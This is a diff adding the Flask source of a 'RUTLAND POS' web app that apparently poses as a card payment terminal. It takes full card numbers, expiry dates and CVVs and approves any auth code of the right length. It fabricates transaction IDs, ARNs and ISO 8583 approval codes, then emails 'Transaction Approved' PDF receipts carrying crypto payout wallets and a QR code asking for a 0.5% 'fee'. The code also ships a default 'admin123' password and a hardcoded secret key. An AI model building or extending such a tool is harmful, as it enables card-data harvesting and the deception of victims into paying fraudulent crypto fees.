@@ -1,0 +1,789 @@
+# app.py - cleaned RUTLAND POS (all cards auto-authorize)
+from flask import Flask, render_template, request, redirect, session, url_for, send_file, flash, jsonify
+from flask_mail import Mail, Message
+import random, logging, os, hashlib, json, re, tempfile
+from functools import wraps
+from decimal import Decimal, InvalidOperation
+from dotenv import load_dotenv
+from datetime import datetime
+import io
+from reportlab.lib.pagesizes import letter
+from reportlab.pdfgen import canvas
+
+# Load environment variables from .env file
+load_dotenv(dotenv_path='.env')
+
+logging.basicConfig(level=logging.INFO)
+
+app = Flask(__name__)
+app.secret_key = os.environ.get('SECRET_KEY', 'rutland_secret_key_8583')
+
+# Email Configuration
+app.config['MAIL_SERVER'] = os.environ.get('MAIL_SERVER', 'smtp.gmail.com')
+app.config['MAIL_PORT'] = int(os.environ.get('MAIL_PORT', 587))
+app.config['MAIL_USE_TLS'] = os.environ.get('MAIL_USE_TLS', 'True').lower() == 'true'
+app.config['MAIL_USERNAME'] = os.environ.get('MAIL_USERNAME', '')
+app.config['MAIL_PASSWORD'] = os.environ.get('MAIL_PASSWORD', '')
+app.config['MAIL_DEFAULT_SENDER'] = os.environ.get('MAIL_DEFAULT_SENDER', 'noreply@rutlandpos.com')
+mail = Mail(app)
+
+# Fixed numeric Server ID for receipts (env SERVER_ID = digits only, e.g. "123456"; default "000000")
+DEFAULT_SERVER_ID = "000000"
+
+def _get_receipt_server_id():
+    """Return fixed numeric server ID for receipts. From env SERVER_ID (digits only), else default."""
+    raw = (os.environ.get('SERVER_ID') or DEFAULT_SERVER_ID).strip()
+    digits = re.sub(r'\D', '', raw)
+    return digits if digits else DEFAULT_SERVER_ID
+
+def _mask_receipt_server_id(server_id):
+    """Return server ID fully masked for display (fixed, numeric underlying value; show only asterisks)."""
+    sid = (server_id or DEFAULT_SERVER_ID).strip()
+    length = max(6, min(len(sid), 12))  # mask length 6–12
+    return "*" * length
+
+def _wallet_image_filename(payout_type):
+    """Return the wallet image filename that exists on disk (tries both cases for Linux)."""
+    payout_upper = (payout_type or "").strip().upper()
+    if payout_upper == "ERC20":
+        candidates = ["ERC20.jpeg", "erc20.jpeg"]
+    else:
+        candidates = ["TRC20.jpeg", "trc20.jpeg"]
+    static_dir = os.path.join(app.root_path, 'static')
+    for name in candidates:
+        if os.path.exists(os.path.join(static_dir, name)):
+            return name
+    return candidates[0]  # fallback so URL is still generated
+
+def _build_receipt_pdf_bytes(txn_id, arn, pan_last4, amount, payout_type, wallet, auth_code, timestamp, server_id=None):
+    """Generate PDF receipt with logo and QR code"""
+    pdf_buffer = io.BytesIO()
+    
+    try:
+        c = canvas.Canvas(pdf_buffer, pagesize=letter)
+        width, height = letter
+        
+        # Logo at top
+        logo_path = os.path.join(app.root_path, 'static', 'logo.jpg')
+        if os.path.exists(logo_path):
+            c.drawImage(logo_path, 40, height - 80, width=120, height=60)
+        
+        y = height - 100
+        
+        # Header
+        c.setFont("Helvetica-Bold", 14)
+        c.drawString(180, y, "RUTLAND POS")
+        y -= 20
+        c.setFont("Helvetica", 10)
+        c.drawString(180, y, "CUSTOMER COPY")
+        y -= 30
+        
+        # Merchant fee wallet image: TRC20.jpeg or ERC20.jpeg (the QR/address to pay 0.5% fee)
+        qr_x = width - 130
+        qr_y_start = y  # Same level as transaction ID
+        
+        qr_image = _wallet_image_filename(payout_type)
+        qr_image_path = os.path.join(app.root_path, 'static', qr_image)
+        if os.path.exists(qr_image_path):
+            c.drawImage(qr_image_path, qr_x, qr_y_start - 100, width=110, height=110)
+        else:
+            logging.warning("Merchant fee image not found at %s (ensure static/%s is in repo and deployed)", qr_image_path, qr_image)
+
+        # Fee label below the merchant fee wallet image
+        try:
+            amount_numeric = float(str(amount).replace(',', ''))
+            merchant_fee = amount_numeric * 0.005  # 0.5% fee
+            fee_label = f"Scan to pay fee (${merchant_fee:.2f})"
+        except (ValueError, TypeError):
+            fee_label = "Scan to pay merchant fee (0.5%)"
+        c.setFont("Helvetica", 7)
+        c.drawString(qr_x, qr_y_start - 115, fee_label)
+
+        # Transaction details (left side)
+        c.setFont("Helvetica", 9)
+        
+        # Mask card number (show only last 4)
+        masked_card = f"**** **** **** {pan_last4}"
+        
+        # Mask auth code
+        masked_auth = "*" * len(auth_code) if auth_code else "****"
+        
+        # Truncate wallet for display
+        wallet_display = wallet[:8] + "..." + wallet[-8:] if wallet and len(wallet) > 20 else wallet
+        
+        # Determine how to show the server/connection on the PDF receipt
+        if server_id is None:
+            sid_source = _get_receipt_server_id()
+            sid = _mask_receipt_server_id(sid_source)
+        else:
+            sid_str = str(server_id).strip()
+            # Special value "OFFLINE" means show as offline instead of masked digits
+            if sid_str.upper() == "OFFLINE":
+                sid = "OFFLINE"
+            else:
+                sid = _mask_receipt_server_id(sid_str)
+        details = [
+            ("Transaction ID:", txn_id),
+            ("ARN:", arn),
+            ("Card:", masked_card),
+            ("Amount:", f"USD {amount}"),
+            ("Auth Code:", masked_auth),
+            ("Status:", "Transaction Approved"),
+            ("Payout Type:", payout_type),
+            ("Receiving Address:", wallet_display if wallet else "N/A"),
+            ("Date/Time:", timestamp),
+            ("Connected Server ID:", sid),
+        ]
+        
+        for label, value in details:
+            c.drawString(40, y, label)
+            c.drawString(180, y, str(value))
+            y -= 15
+        
+        # Move down after details
+        y -= 20
+        
+        # Footer
+        c.setFont("Helvetica", 8)
+        c.drawString(40, y, "FINAL SALE")
+        y -= 12
+        c.drawString(40, y, "Thank you for your transaction.")
+        y -= 12
+        c.drawString(40, y, "Please keep this receipt for your records.")
+        
+        c.save()
+        pdf_buffer.seek(0)
+        return pdf_buffer.getvalue()
+    except Exception as e:
+        logging.exception("Failed to generate receipt PDF")
+        raise
+
+# Configuration
+USERNAME = "rutlandadmin"
+PASSWORD_FILE = "password.json"
+
+# Ensure password file exists
+if not os.path.exists(PASSWORD_FILE):
+    with open(PASSWORD_FILE, "w") as f:
+        hashed = hashlib.sha256("admin123".encode()).hexdigest()
+        json.dump({"password": hashed}, f)
+
+def check_password(raw):
+    with open(PASSWORD_FILE) as f:
+        stored = json.load(f)['password']
+    return hashlib.sha256(raw.encode()).hexdigest() == stored
+
+def set_password(newpass):
+    with open(PASSWORD_FILE, "w") as f:
+        hashed = hashlib.sha256(newpass.encode()).hexdigest()
+        json.dump({"password": hashed}, f)
+
+def login_required(f):
+    @wraps(f)
+    def decorated(*args, **kwargs):
+        if not session.get("logged_in"):
+            return redirect(url_for('login'))
+        return f(*args, **kwargs)
+    return decorated
+
+# Protocols (determine expected auth code length)
+PROTOCOLS = {
+    "POS Terminal -101.1 (4-digit approval)": 4,
+    "POS Terminal -101.4 (6-digit approval)": 6,
+    "POS Terminal -101.6 (Pre-authorization)": 6,
+    "POS Terminal -101.7 (4-digit approval)": 4,
+    "POS Terminal -101.8 (PIN-LESS transaction)": 4,
+    "POS Terminal -201.1 (6-digit approval)": 6,
+    "POS Terminal -201.3 (6-digit approval, offline )": 6,
+    "POS Terminal -201.5 (6-digit approval)": 6
+}
+
+@app.route('/')
+def home():
+    return redirect(url_for('login'))
+
+@app.route('/login', methods=['GET', 'POST'])
+def login():
+    if request.method == 'POST':
+        user = request.form.get('username')
+        passwd = request.form.get('password')
+        if user == USERNAME and check_password(passwd):
+            session.clear()
+            session['logged_in'] = True
+            session['username'] = user
+            return redirect(url_for('protocol'))
+        flash("Invalid username or password.")
+    return render_template('login.html')
+
+@app.route('/logout')
+def logout():
+    session.clear()
+    flash("You have been logged out.")
+    return redirect(url_for('login'))
+
+@app.route('/protocol', methods=['GET', 'POST'])
+@login_required
+def protocol():
+    if request.method == 'POST':
+        selected = request.form.get('protocol')
+        if selected not in PROTOCOLS:
+            flash("Invalid protocol selected.")
+            return redirect(url_for('protocol'))
+        session['protocol'] = selected
+        session['code_length'] = PROTOCOLS[selected]
+
+        # Flag pinless
+        session['pinless'] = ("101.8" in selected)
+
+        # Flag offline, no-CVV protocol (currently 201.3 variant)
+        session['offline'] = ("201.3" in selected)
+
+        return redirect(url_for('amount'))
+    return render_template('protocol.html', protocols=PROTOCOLS.keys())
+
+@app.route('/amount', methods=['GET', 'POST'])
+@login_required
+def amount():
+    if request.method == 'POST':
+        session['amount'] = request.form.get('amount')
+        return redirect(url_for('payout'))
+    return render_template('amount.html')
+
+@app.route('/payout', methods=['GET', 'POST'])
+@login_required
+def payout():
+    if request.method == 'POST':
+        method = request.form['method']
+        session['payout_type'] = method
+
+        if method == 'ERC20':
+            wallet = request.form.get('erc20_wallet', '').strip()
+            if not wallet.startswith("0x") or len(wallet) != 42:
+                flash("Invalid ERC20 address format.")
+                return redirect(url_for('payout'))
+            session['wallet'] = wallet
+
+        elif method == 'TRC20':
+            wallet = request.form.get('trc20_wallet', '').strip()
+            if not wallet.startswith("T") or len(wallet) < 34:
+                flash("Invalid TRC20 address format.")
+                return redirect(url_for('payout'))
+            session['wallet'] = wallet
+
+        return redirect(url_for('card'))
+
+    return render_template('payout.html')
+
+
+# Server-side validator for card entry
+from datetime import datetime
+
+# Top-of-file config (put near other global constants)
+BLACKLIST_PREFIXES = ['1','2','7','8','9','6']  # adjust if you want to allow '6' etc.
+
+def luhn_check(card_number: str) -> bool:
+    """Return True if card_number passes Luhn algorithm."""
+    try:
+        digits = [int(d) for d in card_number]
+    except ValueError:
+        return False
+    checksum = 0
+    dbl = False
+    for d in reversed(digits):
+        if dbl:
+            val = d * 2
+            if val > 9:
+                val -= 9
+            checksum += val
+        else:
+            checksum += d
+        dbl = not dbl
+    return checksum % 10 == 0
+
+@app.route('/card', methods=['GET', 'POST'])
+@login_required
+def card():
+    offline = session.get('offline', False)
+    if request.method == 'POST':
+        # sanitize inputs (client formatting may include spaces/slashes)
+        pan_raw = request.form.get('pan', '')
+        pan_digits = re.sub(r'\D', '', pan_raw)  # remove spaces and non-digits
+        expiry_raw = request.form.get('expiry', '')
+        expiry_clean = re.sub(r'\D', '', expiry_raw)  # MMYY expected after cleaning
+        cvv_raw = request.form.get('cvv', '')
+        cvv_digits = re.sub(r'\D', '', cvv_raw)
+
+        # Basic presence checks
+        if not pan_digits:
+            flash("Card number is required.")
+            return render_template('card.html', offline_no_cvv=offline)
+        if not expiry_clean:
+            flash("Expiry date is required.")
+            return render_template('card.html', offline_no_cvv=offline)
+        if not cvv_digits and not offline:
+            flash("CVV is required.")
+            return render_template('card.html', offline_no_cvv=offline)
+
+        # PAN length check (must be exactly 16 digits for your flow)
+        if len(pan_digits) != 16:
+            flash("Card must be 16 digits.")
+            return render_template('card.html', offline_no_cvv=offline)
+
+        # BIN prefix blacklist (first digit)
+        first_digit = pan_digits[0]
+        if first_digit in BLACKLIST_PREFIXES:
+            flash("Invalid / unsupported card BIN.")
+            return render_template('card.html', offline_no_cvv=offline)
+
+        # Luhn check
+        if not luhn_check(pan_digits):
+            flash("Card number failed validation (invalid number).")
+            return render_template('card.html', offline_no_cvv=offline)
+
+        # Expiry: expect MMYY (2 + 2)
+        if len(expiry_clean) != 4:
+            flash("Expiry must be in MM/YY format.")
+            return render_template('card.html', offline_no_cvv=offline)
+        try:
+            month = int(expiry_clean[:2])
+            year_two = int(expiry_clean[2:])
+        except ValueError:
+            flash("Expiry must contain a valid month and year.")
+            return render_template('card.html', offline_no_cvv=offline)
+        if month < 1 or month > 12:
+            flash("Expiry month must be between 01 and 12.")
+            return render_template('card.html', offline_no_cvv=offline)
+
+        # Convert two-digit year to full year (assume 2000-2099)
+        year_full = 2000 + year_two
+        now = datetime.now()
+        # If expiry is at end of expiry month, it's still valid for that month
+        expiry_dt = datetime(year=year_full, month=month, day=1)
+        # Compare (year,month) to current (year,month)
+        if (year_full < now.year) or (year_full == now.year and month < now.month):
+            flash("Card has expired.")
+            return render_template('card.html', offline_no_cvv=offline)
+
+        # Card type inference for CVV length
+        if pan_digits.startswith("4"):
+            card_type = "VISA"
+            expected_cvv_len = 3
+        elif pan_digits.startswith("5"):
+            card_type = "MASTERCARD"
+            expected_cvv_len = 3
+        elif pan_digits.startswith("3"):
+            card_type = "AMEX"
+            expected_cvv_len = 4
+        elif pan_digits.startswith("6"):
+            card_type = "DISCOVER"
+            expected_cvv_len = 3
+        else:
+            card_type = "UNKNOWN"
+            expected_cvv_len = 3
+
+        if offline:
+            # In offline mode, CVV is optional; if provided, it must still match expected length
+            if cvv_digits and len(cvv_digits) != expected_cvv_len:
+                flash(f"CVV must be {expected_cvv_len} digits for {card_type} when provided.")
+                return render_template('card.html', offline_no_cvv=offline)
+        else:
+            if len(cvv_digits) != expected_cvv_len:
+                flash(f"CVV must be {expected_cvv_len} digits for {card_type}.")
+                return render_template('card.html', offline_no_cvv=offline)
+
+        # Validate email
+        email = request.form.get('email', '').strip()
+        if not email or '@' not in email:
+            flash("Please enter a valid email address.")
+            return render_template('card.html', offline_no_cvv=offline)
+
+        # All server-side validations passed -> store values and continue
+        # NOTE: Avoid logging sensitive values (do not log CVV).
+        session.update({
+            'pan': pan_digits,
+            'exp': expiry_clean,
+            'cvv': cvv_digits,          # stored in session for auth flow; remove if you prefer not to store
+            'card_type': card_type,
+            'email': email
+        })
+
+        # If pinless, jump straight to decrypting screen
+        if session.get("pinless"):
+            return redirect(url_for('decrypting'))
+
+        return redirect(url_for('auth'))
+
+    # GET handler
+    return render_template('card.html', offline_no_cvv=offline)
+
+
+@app.route('/decrypting')
+@login_required
+def decrypting():
+    # Pinless (101.8): set transaction details here so flow can proceed to processing -> success like other protocols
+    if not session.get('txn_id'):
+        code_length = session.get('code_length', 4)
+        session.update({
+            "txn_id": f"TXN{random.randint(100000, 999999)}",
+            "arn": f"ARN{random.randint(100000000000, 999999999999)}",
+            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+            "field39": "00",
+            "auth_code": "".join(str(random.randint(0, 9)) for _ in range(code_length)),
+        })
+    return render_template('decrypting.html')
+
+@app.route('/auth', methods=['GET', 'POST'])
+@login_required
+def auth():
+    expected_length = session.get('code_length', 6)
+
+    if request.method == 'POST':
+        code = request.form.get('auth', '').strip()
+
+        # Validate length only. Approve any card/code that matches expected length.
+        if len(code) != expected_length:
+            return render_template('auth.html',
+                                   warning=f"Code must be {expected_length} digits.",
+                                   expected_length=expected_length)
+
+        # Store auth code and transaction details, then redirect to processing
+        txn_id = f"TXN{random.randint(100000, 999999)}"
+        arn = f"ARN{random.randint(100000000000, 999999999999)}"
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        field39 = "00"
+
+        session.update({
+            "txn_id": txn_id,
+            "arn": arn,
+            "timestamp": timestamp,
+            "field39": field39,
+            "auth_code": code  # store entered code for receipt masking
+        })
+        return redirect(url_for('processing'))
+
+    return render_template('auth.html', expected_length=expected_length)
+
+@app.route('/processing')
+@login_required
+def processing():
+    # Show connecting screen, JS will handle the 30-second wait and redirect to failure
+    return render_template('processing.html')
+
+@app.route('/success')
+@login_required
+def success():
+    # Automatically send receipt email
+    recipient_email = session.get('email')
+    if recipient_email and app.config['MAIL_USERNAME'] and app.config['MAIL_PASSWORD']:
+        logging.info("Preparing automatic receipt email for %s", recipient_email)
+        try:
+            # Prepare receipt data
+            raw_protocol = session.get("protocol", "")
+            match = re.search(r"-(\d+\.\d+)\s+\((\d+)-digit", raw_protocol)
+            if match:
+                protocol_version = match.group(1)
+                auth_digits = int(match.group(2))
+            else:
+                protocol_version = "Unknown"
+                auth_digits = 4
+            
+            raw_amount = session.get("amount", "0")
+            try:
+                amt = Decimal(str(raw_amount))
+                amount_fmt = f"{amt:,.2f}"
+            except (InvalidOperation, TypeError):
+                amount_fmt = "0.00"
+            
+            # Get actual auth code (not masked)
+            auth_code = session.get("auth_code", "")
+            if not auth_code:
+                auth_code = "*" * auth_digits
+            
+            # Determine wallet image
+            payout_type = (session.get("payout_type") or "").strip().upper()
+            wallet_image = _wallet_image_filename(session.get("payout_type"))
+
+            # Set server/connection indicator for PDF receipt (OFFLINE vs masked server ID)
+            offline = session.get("offline", False)
+            if offline:
+                server_for_pdf = "OFFLINE"
+            else:
+                server_for_pdf = _get_receipt_server_id()
+            pdf_bytes = _build_receipt_pdf_bytes(
+                txn_id=session.get('txn_id'),
+                arn=session.get('arn'),
+                pan_last4=session.get("pan")[-4:] if session.get("pan") else "",
+                amount=amount_fmt,
+                payout_type=session.get("payout_type"),
+                wallet=session.get("wallet"),
+                auth_code=auth_code,
+                timestamp=session.get("timestamp"),
+                server_id=server_for_pdf
+            )
+            
+            # Create email message
+            subject = f"Rutland POS Receipt - Transaction {session.get('txn_id')}"
+            
+            body = f"""Dear Customer,
+
+Thank you for your transaction at Rutland POS.
+
+Please find your receipt attached as a PDF.
+
+Transaction Summary:
+- Transaction ID: {session.get('txn_id')}
+- Amount: USD {amount_fmt}
+- Date: {session.get('timestamp')}
+- Status: Approved
+
+---
+Rutland POS Terminal
+Oakham, UK
+
+This is an automated receipt. Please keep for your records.
+            """
+            
+            msg = Message(
+                subject=subject,
+                recipients=[recipient_email],
+                body=body,
+                sender=app.config['MAIL_DEFAULT_SENDER']
+            )
+            
+            # Attach PDF receipt
+            msg.attach(
+                f"receipt_{session.get('txn_id')}.pdf",
+                "application/pdf",
+                pdf_bytes
+            )
+            
+            mail.send(msg)
+            logging.info(f"Receipt email with PDF sent automatically to {recipient_email}")
+        except Exception as e:
+            logging.exception("Failed to send automatic receipt email")
+            # Don't fail the success page if email fails
+    else:
+        logging.info("Skipping automatic receipt email: missing recipient or mail config")
+    
+    return render_template('success.html',
+        txn_id=session.get("txn_id"),
+        arn=session.get("arn"),
+        pan=session.get("pan", "")[-4:],
+        amount=session.get("amount"),
+        timestamp=session.get("timestamp")
+    )
+
+@app.route("/receipt")
+def receipt():
+    raw_protocol = session.get("protocol", "")
+    match = re.search(r"-(\d+\.\d+)\s+\((\d+)-digit", raw_protocol)
+    if match:
+        protocol_version = match.group(1)
+        auth_digits = int(match.group(2))
+    else:
+        protocol_version = "Unknown"
+        auth_digits = 4
+
+    raw_amount = session.get("amount", "0")
+    try:
+        # try parse as Decimal for nicer formatting
+        amt = Decimal(str(raw_amount))
+        amount_fmt = f"{amt:,.2f}"
+    except (InvalidOperation, TypeError):
+        amount_fmt = "0.00"
+
+    # Determine how to mask the auth code:
+    stored_auth = session.get("auth_code", "")
+    if stored_auth:
+        auth_mask = "*" * len(stored_auth)
+    else:
+        auth_mask = "*" * auth_digits
+
+    # Choose wallet image based on payout type (resolves actual filename on disk for case-sensitive hosts)
+    payout_type = (session.get("payout_type") or "").strip().upper()
+    wallet_image = _wallet_image_filename(session.get("payout_type"))
+    logging.info(f"Receipt payout_type: '{payout_type}', wallet_image: {wallet_image}")
+
+    # Show OFFLINE on receipt when using offline protocol, otherwise masked server ID
+    if session.get("offline"):
+        server_id = "OFFLINE"
+    else:
+        server_id = _mask_receipt_server_id(_get_receipt_server_id())
+    return render_template("receipt.html",
+        txn_id=session.get("txn_id"),
+        arn=session.get("arn"),
+        pan=session.get("pan")[-4:] if session.get("pan") else "",
+        amount=amount_fmt,
+        payout=session.get("payout_type"),
+        wallet=session.get("wallet"),
+        wallet_image=wallet_image,
+        auth_code=auth_mask,
+        email=session.get("email"),
+        iso_field_18="5999",                # Default MCC
+        iso_field_25="00",                  # POS condition
+        field39="00",                       # ISO8583 Field 39 (approved)
+        card_type=session.get("card_type", "VISA"),
+        protocol_version=protocol_version,
+        timestamp=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+        server_id=server_id
+    )
+
+@app.route('/receipt_print')
+@login_required
+def receipt_print():
+    """Printable version of receipt that triggers browser print"""
+    if session.get("offline"):
+        server_id = "OFFLINE"
+    else:
+        server_id = _mask_receipt_server_id(_get_receipt_server_id())
+    return render_template("receipt_print.html",
+        txn_id=session.get("txn_id"),
+        arn=session.get("arn"),
+        pan=session.get("pan")[-4:] if session.get("pan") else "",
+        amount=session.get("amount"),
+        payout=session.get("payout_type"),
+        wallet=session.get("wallet"),
+        auth_code=session.get("auth_code", "****"),
+        email=session.get("email"),
+        iso_field_18="5999",
+        iso_field_25="00",
+        field39="00",
+        card_type=session.get("card_type", "VISA"),
+        protocol_version=session.get("protocol", ""),
+        timestamp=session.get("timestamp", datetime.now().strftime("%Y-%m-%d %H:%M:%S")),
+        server_id=server_id
+    )
+
+@app.route('/send-receipt-email', methods=['POST'])
+def send_receipt_email():
+    """Send receipt via email with PDF attachment - using screenshot for accurate rendering"""
+    recipient_email = request.form.get('email', '').strip()
+    
+    # Validate email format
+    if not recipient_email or '@' not in recipient_email:
+        return jsonify({'success': False, 'error': 'Invalid email address'}), 400
+    
+    # Check if we have email configuration
+    if not app.config['MAIL_USERNAME'] or not app.config['MAIL_PASSWORD']:
+        return jsonify({'success': False, 'error': 'Email service not configured'}), 500
+
+    logging.info("Preparing manual receipt email for %s", recipient_email)
+    
+    try:
+        # Prepare receipt data
+        raw_protocol = session.get("protocol", "")
+        match = re.search(r"-(\d+\.\d+)\s+\((\d+)-digit", raw_protocol)
+        if match:
+            protocol_version = match.group(1)
+            auth_digits = int(match.group(2))
+        else:
+            protocol_version = "Unknown"
+            auth_digits = 4
+        
+        raw_amount = session.get("amount", "0")
+        try:
+            amt = Decimal(str(raw_amount))
+            amount_fmt = f"{amt:,.2f}"
+        except (InvalidOperation, TypeError):
+            amount_fmt = "0.00"
+        
+        # Get actual auth code (not masked)
+        auth_code = session.get("auth_code", "")
+        if not auth_code:
+            auth_code = "*" * auth_digits
+        
+        # Determine wallet image
+        payout_type = (session.get("payout_type") or "").strip().upper()
+        wallet_image = _wallet_image_filename(session.get("payout_type"))
+
+        # Set server/connection indicator for PDF receipt (OFFLINE vs masked server ID)
+        if session.get("offline"):
+            server_id = "OFFLINE"
+        else:
+            server_id = _get_receipt_server_id()
+        pdf_bytes = _build_receipt_pdf_bytes(
+            txn_id=session.get('txn_id'),
+            arn=session.get('arn'),
+            pan_last4=session.get("pan")[-4:] if session.get("pan") else "",
+            amount=amount_fmt,
+            payout_type=session.get("payout_type"),
+            wallet=session.get("wallet"),
+            auth_code=auth_code,
+            timestamp=session.get("timestamp"),
+            server_id=server_id
+        )
+        
+        # Create email message
+        subject = f"Rutland POS Receipt - Transaction {session.get('txn_id')}"
+        
+        body = f"""Dear Customer,
+
+Thank you for your transaction at Rutland POS.
+
+Please find your receipt attached as a PDF.
+
+Transaction Summary:
+- Transaction ID: {session.get('txn_id')}
+- Amount: USD {amount_fmt}
+- Date: {session.get('timestamp')}
+- Status: Approved
+
+---
+Rutland POS Terminal
+Oakham, UK
+
+This is an automated receipt. Please keep for your records.
+        """
+        
+        msg = Message(
+            subject=subject,
+            recipients=[recipient_email],
+            body=body,
+            sender=app.config['MAIL_DEFAULT_SENDER']
+        )
+        
+        # Attach PDF receipt
+        msg.attach(
+            f"receipt_{session.get('txn_id')}.pdf",
+            "application/pdf",
+            pdf_bytes
+        )
+        
+        mail.send(msg)
+        logging.info(f"Receipt email with PDF sent successfully to {recipient_email}")
+        return jsonify({'success': True, 'message': 'Receipt sent successfully'}), 200
+    
+    except Exception as e:
+        logging.exception("Failed to send receipt email")
+        return jsonify({'success': False, 'error': f'Failed to send email: {str(e)}'}), 500
+
+@app.route('/rejected')
+def rejected():
+    # Kept for compatibility but rarely used now that all cards auto-approve.
+    return render_template('rejected.html',
+        code=request.args.get("code", "XX"),
+        reason=request.args.get("reason", "Transaction Declined")
+    )
+
+@app.route("/licence")
+def licence():
+    return render_template("licence.html")
+
+@app.route('/offline')
+@login_required
+def offline():
+    return render_template('offline.html')
+
+@app.route('/.well-known/assetlinks.json')
+def assetlinks():
+    assetlinks_path = os.path.join(app.root_path, 'static', '.well-known', 'assetlinks.json')
+    return send_file(assetlinks_path, mimetype='application/json')
+
+@app.route('/manifest.json')
+def manifest():
+    manifest_path = os.path.join(app.root_path, 'static', 'manifest.json')
+    return send_file(manifest_path, mimetype='application/json')
+
+if __name__ == '__main__':
+    port = int(os.environ.get('PORT', 5000))
+    app.run(host='0.0.0.0', port=port, debug=False)
